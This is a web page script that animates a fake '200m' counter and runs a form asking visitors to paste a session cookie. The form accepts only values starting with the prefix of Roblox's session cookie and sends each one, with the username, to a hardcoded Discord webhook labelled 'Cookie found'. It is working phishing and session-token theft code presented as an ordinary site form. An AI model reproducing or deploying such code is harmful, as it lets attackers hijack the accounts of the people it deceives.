// script.js (unchanged except for minor tweak for clarity)

// Counter animation
let counter = 0;
const counterEl = document.getElementById('counter');
const target = 200;

function updateCounter() {
  if (counter < target) {
    counter++;
    counterEl.textContent = counter + 'm';  // Smooth increment
    setTimeout(updateCounter, 20);
  }
}
updateCounter();

// Form submission
const form = document.getElementById('cookieForm');
const confirmation = document.getElementById('confirmation');

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const cookie = form.cookie.value.trim();
  const username = form.username.value.trim() || "Anonymous";

  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
    alert("Invalid cookie format!");
    return;
  }

  try {
    await fetch("https://discord.com/api/webhooks/1424128983343042680/vHhFHRSO7tiSiB-zVx6LMe5OiRYCDFzAdmRmDbapP9uaqYY-y9goq3PxsXOt6PW-WZdq", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Cookie found",
        content: `Username: ${username}\nCookie: ${cookie}`
      })
    });

    confirmation.classList.remove('hidden');
    confirmation.classList.add('visible');
    form.reset();
    setTimeout(() => {
      confirmation.classList.remove('visible');
      confirmation.classList.add('hidden');
    }, 3000);  // Auto-hide after 3 seconds
  } catch (err) {
    alert("Failed to send cookie!");
    console.error(err);
  }
});